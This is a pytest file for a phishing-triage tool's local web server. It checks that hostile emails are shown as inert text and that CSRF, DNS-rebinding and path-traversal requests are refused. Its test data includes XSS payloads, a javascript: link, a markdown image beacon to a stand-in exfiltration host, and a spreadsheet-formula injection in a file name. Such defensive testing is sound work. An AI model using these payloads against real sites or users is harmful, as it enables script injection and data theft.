"""The local web interface, attacked the way a hostile email, a hostile website or another local user would."""
import csv
import http.client
import io
import json
import re
import threading
from email.message import EmailMessage
from email.policy import SMTP

import pytest

from phishtriage.config import Settings
from phishtriage.isolate import AnalysisFailed, InProcessAnalyzer
from phishtriage.web.html import Markup, el
from phishtriage.web.server import MAX_BODY, App, FormError, make_server, parse_form

SETTINGS = Settings(dkim_recheck=False)
BOUNDARY = "----phishtriageTestBoundaryXyZ123"


def hostile_email() -> bytes:
    """Markup, a tracking pixel, a javascript: link, bidi overrides and a spreadsheet formula, on reserved domains."""
    msg = EmailMessage(policy=SMTP)
    msg["From"] = '"PayPal\u202e gnp.exe <svg onload=alert(3)>" <service@evil.example>'
    msg["To"] = "victim@company.test"
    msg["Subject"] = '<script>alert(1)</script> "><img src=x onerror=alert(2)> ![x](https://exfil.example/?d=1)'
    msg["Message-ID"] = "<hostile-1@evil.example>"
    msg["Date"] = "Mon, 19 Oct 2026 09:00:00 +0000"
    msg.set_content("Pay\u200bPal: verify your account within 24 hours: https://evil.example/login")
    msg.add_alternative('<html><head><base href="https://evil.example/"><style>p{}</style></head><body>'
                        '<p>Pay\u200bPal: <a href="javascript:alert(4)">open</a> '
                        '<a href="https://evil.example/login">https://www.paypal.com</a></p>'
                        '<img src="https://tracker.example/pixel.gif?u=victim">'
                        '<iframe src="https://evil.example/frame"></iframe></body></html>', subtype="html")
    msg.add_attachment(b"MZ fake", maintype="application", subtype="octet-stream", filename="invoice\u202efdp.exe")
    msg.add_attachment(b"a,b", maintype="text", subtype="csv", filename='=HYPERLINK("http://evil.example","x").csv')
    return msg.as_bytes()


class FailingAnalyzer:
    def analyze(self, raw):
        raise AnalysisFailed("the analysis did not finish within 60 seconds and was stopped")


def form(fields: dict[str, str], file: tuple[str, bytes] | None = None) -> bytes:
    parts = [f'--{BOUNDARY}\r\nContent-Disposition: form-data; name="{name}"\r\n\r\n{value}\r\n'.encode()
             for name, value in fields.items()]
    if file:
        parts.append(f'--{BOUNDARY}\r\nContent-Disposition: form-data; name="file"; filename="{file[0]}"\r\n'
                     f'Content-Type: message/rfc822\r\n\r\n'.encode() + file[1] + b"\r\n")
    return b"".join(parts) + f"--{BOUNDARY}--\r\n".encode()


class Client:
    """Talks to the test server like the analyst's browser, holding the session cookie of this run."""

    def __init__(self, app, port):
        self.app, self.port = app, port

    def request(self, method, path, body=None, headers=None, session=True):
        conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=30)
        cookie = {"Cookie": f"phishtriage_session={self.app.session}"} if session else {}
        conn.request(method, path, body=body, headers={"Host": f"127.0.0.1:{self.port}", **cookie, **(headers or {})})
        response = conn.getresponse()
        data = response.read()
        conn.close()
        return response, data

    def post_form(self, path, body, headers=None, session=True):
        return self.request("POST", path, body, {"Content-Type": f"multipart/form-data; boundary={BOUNDARY}",
                                                 "Origin": f"http://127.0.0.1:{self.port}", **(headers or {})}, session)

    def upload(self, raw: bytes, name="hostile.eml", token=None, headers=None):
        return self.post_form("/analyze", form({"token": self.app.token if token is None else token}, (name, raw)),
                              headers)


@pytest.fixture
def server():
    started = []

    def start(analyzer=None) -> Client:
        app = App(SETTINGS, analyzer or InProcessAnalyzer(SETTINGS))
        httpd = make_server(app, port=0)
        threading.Thread(target=httpd.serve_forever, daemon=True).start()
        started.append(httpd)
        return Client(app, httpd.server_address[1])

    yield start
    for httpd in started:
        httpd.shutdown()
        httpd.server_close()


def test_pages_forbid_scripts_frames_caching_and_sniffing(server):
    client = server()
    response, page = client.request("GET", "/")
    csp = response.getheader("Content-Security-Policy")
    assert "default-src 'none'" in csp and "script" not in csp and "frame-ancestors 'none'" in csp
    assert response.getheader("X-Content-Type-Options") == "nosniff" and response.getheader("Cache-Control") == "no-store"
    assert response.getheader("X-Frame-Options") == "DENY" and response.getheader("Referrer-Policy") == "same-origin"
    assert b"<script" not in page and client.app.token.encode() in page


def test_only_the_person_who_started_it_gets_in(server):
    # Other programs and users on this computer can reach 127.0.0.1 too
    client = server()
    assert client.request("GET", "/", session=False)[0].status == 401
    assert client.request("GET", "/?key=wrong", session=False)[0].status == 403
    response, _ = client.request("GET", f"/?key={client.app.launch_key}", session=False)
    assert response.status == 303 and response.getheader("Location") == "/"  # the key leaves the address bar
    cookie = response.getheader("Set-Cookie")
    assert f"phishtriage_session={client.app.session}" in cookie and "HttpOnly" in cookie and "SameSite=Strict" in cookie
    assert client.request("GET", "/")[0].status == 200
    location = client.upload(hostile_email())[0].getheader("Location")
    assert client.request("GET", location, session=False)[0].status == 401  # reports too
    assert client.post_form("/analyze", form({"token": client.app.token}, ("a.eml", b"x")), session=False)[0].status == 401


def test_no_other_program_can_share_the_port(server):
    # On Windows, SO_REUSEADDR let a second server open the same port; connections then went to either one
    # (an old copy kept answering Fathia's uploads, 2026-10-22), and any program could have received the uploads.
    from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

    client = server()
    with pytest.raises(OSError):
        make_server(App(SETTINGS, InProcessAnalyzer(SETTINGS)), port=client.port)  # a second copy of the tool
    with pytest.raises(OSError):
        ThreadingHTTPServer(("127.0.0.1", client.port), BaseHTTPRequestHandler)  # any program, SO_REUSEADDR on
    assert client.request("GET", "/")[0].status == 200


def test_an_old_link_is_harmless_once_logged_in(server):
    client = server()
    response, _ = client.request("GET", "/?key=an-old-key-from-the-history")
    assert response.status == 303 and response.getheader("Location") == "/"
    assert client.request("GET", "/?key=an-old-key-from-the-history", session=False)[0].status == 403


def test_other_host_names_are_refused(server):
    # DNS rebinding: evil.example made to resolve to 127.0.0.1 still sends Host: evil.example
    client = server()
    assert client.request("GET", "/", headers={"Host": f"evil.example:{client.port}"})[0].status == 421
    assert client.request("GET", "/", headers={"Host": f"localhost:{client.port}"})[0].status == 200


def test_other_websites_cannot_submit_emails(server):
    client = server()
    raw = hostile_email()
    assert client.upload(raw, token="wrong")[0].status == 403  # no valid token
    assert client.upload(raw, headers={"Origin": "https://evil.example"})[0].status == 403  # CSRF from a website
    assert client.upload(raw, headers={"Origin": "null"})[0].status == 403  # sandboxed frame, older browser
    assert client.upload(raw, headers={"Origin": "null", "Sec-Fetch-Site": "cross-site"})[0].status == 403  # newer one
    assert client.upload(raw, headers={"Sec-Fetch-Site": "cross-site"})[0].status == 403
    assert client.upload(raw, headers={"Origin": "https://evil.example", "Sec-Fetch-Site": "same-origin"})[0].status == 403
    assert client.app.recent() == []
    response, _ = client.upload(raw)
    assert response.status == 303 and re.fullmatch(r"/report/[A-Za-z0-9_-]{22}", response.getheader("Location"))


def test_a_real_browser_form_is_accepted(server):
    # What Chrome sent for Fathia's uploads (2026-10-22): under a no-referrer policy, our own form posts with
    # "Origin: null". The first version refused that, so no upload from a real browser ever worked.
    client = server()
    for headers in ({"Origin": "null", "Sec-Fetch-Site": "same-origin"},
                    {"Origin": f"http://127.0.0.1:{client.port}", "Sec-Fetch-Site": "same-origin"}):
        assert client.upload(hostile_email(), headers=headers)[0].status == 303


def test_every_form_posts_what_the_server_reads(server):
    # The server reads multipart only. "Forget all reports" posted URL-encoded and got a 400 in a real browser
    # (2026-10-22); the tests had always sent multipart themselves, so only a browser could show it.
    client = server()
    client.upload(hostile_email())
    page = client.request("GET", "/")[1].decode()
    forms = re.findall(r"<form[^>]*>", page)
    assert len(forms) == 2  # analyze, forget
    for tag in forms:
        assert 'method="post"' in tag and 'enctype="multipart/form-data"' in tag, tag


def test_oversized_and_malformed_uploads_are_refused(server):
    client = server()
    response, _ = client.request("POST", "/analyze", b"", {"Content-Length": str(MAX_BODY + 1),
                                                           "Content-Type": f"multipart/form-data; boundary={BOUNDARY}"})
    assert response.status == 413
    assert client.request("POST", "/analyze", b"not a form", {"Content-Type": "text/plain"})[0].status == 400


def test_a_hostile_email_is_shown_as_inert_text(server):
    client = server()
    location = client.upload(hostile_email())[0].getheader("Location")
    response, data = client.request("GET", location)
    page = data.decode()
    assert response.status == 200 and "Malicious" in page
    assert "<script" not in page.lower() and not re.search(r"<[^>]*\son\w+\s*=", page, re.I)  # no script, no handlers
    assert not re.search(r"<(img|iframe|base|form)[^>]*(https?:|evil|tracker)", page, re.I)  # nothing remote loads
    assert all(href.startswith("/") for href in re.findall(r'href="([^"]*)"', page))  # no link leaves the tool
    assert "&lt;script&gt;alert(1)&lt;/script&gt;" in page and "&lt;svg onload=alert(3)&gt;" in page
    assert "\u202e" not in page and "\u200b" not in page  # direction tricks and zero-width characters...
    assert "U+202E" in page and "U+200B" in page  # ...are shown, not applied
    assert "hxxps://evil[.]example/login" in page and "https://evil.example/login" not in page  # defanged


def test_exports_are_downloads_and_neutralized(server):
    client = server()
    location = client.upload(hostile_email())[0].getheader("Location")
    response, data = client.request("GET", location + "/report.md")
    markdown = data.decode()
    assert "attachment" in response.getheader("Content-Disposition")
    assert "`<script>alert(1)</script>" in markdown  # inside a code span: never rendered
    assert "![x](hxxps://exfil[.]example" in markdown and "](https://" not in markdown  # no live image beacon
    response, data = client.request("GET", location + "/iocs.csv")
    rows = list(csv.reader(io.StringIO(data.decode("utf-8-sig"))))
    assert not [cell for row in rows for cell in row if cell[:1] in "=+-@"]  # no cell a spreadsheet would run
    assert any(row[0] == "url" and row[2] == "hxxps://evil[.]example/login" for row in rows)
    response, data = client.request("GET", location + "/report.json")
    assert json.loads(data)["verdict"]["verdict"] == "Malicious"


def test_reports_are_private_and_can_be_forgotten(server):
    client = server()
    location = client.upload(hostile_email())[0].getheader("Location")
    assert client.request("GET", "/report/AAAAAAAAAAAAAAAAAAAAAA")[0].status == 404  # IDs are not guessable
    assert client.request("GET", "/report/../../etc/passwd")[0].status == 404
    response, _ = client.post_form("/forget", form({"token": client.app.token}))
    assert response.status == 303 and client.request("GET", location)[0].status == 404


def test_a_failed_analysis_is_never_shown_as_clean(server):
    client = server(FailingAnalyzer())
    location = client.upload(hostile_email())[0].getheader("Location")
    page = client.request("GET", location)[1].decode()
    assert "Analysis failed" in page and "not a sign it is safe" in page and "No indicators found" not in page
    assert client.request("GET", location + "/report.json")[0].status == 404


def test_capped_findings_are_explained_and_ordered_by_applied_points():
    from phishtriage.rules.engine import Finding, Verdict, display_order
    from phishtriage.web.pages import _verdict_section

    spf = Finding("AUTH-002", "SPF fails", 0, "authentication", "SPF fail", rule_points=15)
    auth = Finding("AUTH-001", "Not authenticated", 15, "authentication", "no DMARC pass", rule_points=20)
    hidden = Finding("HIDDEN-001", "Hidden text", 20, "hidden-text", "457 hidden words", rule_points=20)
    assert [f.id for f in display_order([auth, spf, hidden])] == ["HIDDEN-001", "AUTH-001", "AUTH-002"]
    assert spf.capped and auth.capped and not hidden.capped
    html = _verdict_section(Verdict("Malicious", 90, [auth, spf, hidden]))
    assert "capped (rule +15)" in html and "count only up to a limit per category" in html
    assert html.index("HIDDEN-001") < html.index("AUTH-001") < html.index("AUTH-002")


def test_link_counts_match_the_list(server):
    # The first version said "4 web link(s)" above "All 3 links": a picture counted in one and not the other
    client = server()
    raw = (b"From: a@evil.example\r\nTo: b@company.test\r\nSubject: s\r\nContent-Type: text/html\r\n\r\n"
           b'<a href="https://one.example.com/">1</a> <a href="https://two.example.com/">2</a>'
           b'<img src="https://pixel.example.com/p.gif">\r\n')
    page = client.request("GET", client.upload(raw)[0].getheader("Location"))[1].decode()
    assert "2 link(s) and 1 picture(s) loaded from the web, to 1 organization(s)." in page
    assert "All 2 link(s) and 1 picture(s)" in page


def test_form_parser_keeps_the_file_bytes_exactly():
    data = b"Subject: x\r\n\r\nline\r\n--almost-a-boundary\r\n\r\n\x00\xff end"
    fields = parse_form(form({"token": "t", "lookups": "1"}, ("a b.eml", data)),
                        f"multipart/form-data; boundary={BOUNDARY}")
    assert fields["file"] == ("a b.eml", data) and fields["token"] == (None, b"t") and "lookups" in fields
    for broken in (b"", b"--other\r\n", form({"token": "t"})[:-10]):
        with pytest.raises(FormError):
            parse_form(broken, f"multipart/form-data; boundary={BOUNDARY}")
    with pytest.raises(FormError):
        parse_form(form({"token": "t"}), "multipart/form-data")  # no boundary


def test_html_builder_escapes_by_default_and_refuses_outside_links():
    assert el("td", "<b>") == "<td>&lt;b&gt;</td>"
    assert Markup("<b>") + "<i>" == "<b>&lt;i&gt;" and "<i>" + Markup("<b>") == "&lt;i&gt;<b>"
    assert el("a", "x", href="/report/abc") == '<a href="/report/abc">x</a>'
    # "//evil.example/x" is a protocol-relative link to another site: this test caught it slipping through
    for url in ("https://evil.example", "javascript:alert(1)", "//evil.example/x", "data:text/html,x"):
        with pytest.raises(ValueError):
            el("a", "x", href=url)
